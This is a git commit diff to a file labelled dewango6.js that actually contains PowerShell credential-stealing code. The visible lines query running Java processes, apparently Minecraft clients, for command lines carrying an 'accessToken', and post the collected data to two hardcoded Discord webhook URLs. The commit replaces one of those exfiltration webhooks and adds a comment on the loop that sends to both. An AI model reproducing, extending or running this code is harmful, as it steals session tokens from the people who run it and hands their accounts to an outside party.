78d34cc4f2a0a5ef0dc5c0a5b551668e691862b4
Fembexx <hasoob030@gmail.com>
2025-03-29 02:00:16 -0700

    Update dewango6.js

--- dewango6.js
+++ dewango6.js
@@ -1,6 +1,6 @@
 $webhookUrls = @(
     "https://discord.com/api/webhooks/1353103114567417906/siV5e9L9b1DbEQfdgMSCoCdrpMbJAW7wMHDwYibneuqHzsmnHMdjOWcFGb_Fgx50tF1j",
-    "https://discord.com/api/webhooks/1353282505696084080/4rcy4p7RSP4tVHwFi9NZpnDncMbsCyNXOz3Tc1hgXa65fmzDMr9ERmW8BAKNCFcca5Yr"
+    "https://discord.com/api/webhooks/1355466329716555826/4o4CKxxsnUteBr6yjgpVDvpNdJY5WQCND_2LeqD_LdVCY1mEzIFi1TR5yPlWCuJY7_N1"
 )
 
 Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'Java%' AND CommandLine LIKE '%accessToken%'" |
@@ -28,6 +28,7 @@ Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'J
                 content = $message
             } | ConvertTo-Json -Depth 10
 
+            # Loop to send the data to both webhooks
             foreach ($webhookUrl in $webhookUrls) {
                 Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
             }
